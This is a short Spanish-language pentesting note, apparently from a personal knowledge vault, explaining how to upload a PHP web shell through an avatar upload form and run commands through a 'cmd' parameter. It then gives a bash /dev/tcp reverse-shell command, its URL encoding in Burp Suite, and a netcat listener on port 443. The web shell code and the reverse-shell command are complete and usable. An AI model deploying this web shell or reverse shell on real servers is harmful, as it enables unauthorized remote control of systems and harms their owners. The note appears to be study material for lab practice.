
Es una alternativa a [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]]
Tenemos que crear un archivo en PHP le llamaremos `web_shell.php`
````php
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "<pre>";
?>
````

Igual que hacíamos anteriormente cuando lo creábamos con [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]] y encontramos el directorio donde se subían los fichero aquí igual, tenemos que navegar a ese fichero.
Hacemos click en el fichero que hemos subido y desde la URL obtenemos la web shell
`http://192.168.1.19/uploads/avatar_jaime_web_shell.php`

Detrás de .php anadimos
`http://192.168.1.19/uploads/avatar_jaime_web_shell.php?cmd=` 

Y ya después del `=` podemos añadir cualquier comando.
Si queremos obtener acceso a la maquina mediante una reverse shell.
Utilizamos Burpsuite y en la parte de Decodcer pegamos el comando de la reverse shell.
![[Pasted image 20241212200427.png]]

Y usamos el siguiente comando para obtener la revrse shell
`bash -c "bash -i >& /dev/tcp/<IP_local>/443 0>&1"`

A la derecha del panel donde pone Encode As... Tenemos que seleccionar URL
Nos ponemos en escucha en el puerto 443 con [[NETCAT]]
`nc -lvnp 443`

Copiamos el comando codeado y lo añadimos después de `cmd=`
Obtendremos una reverse shell en nuestro [[NETCAT]]
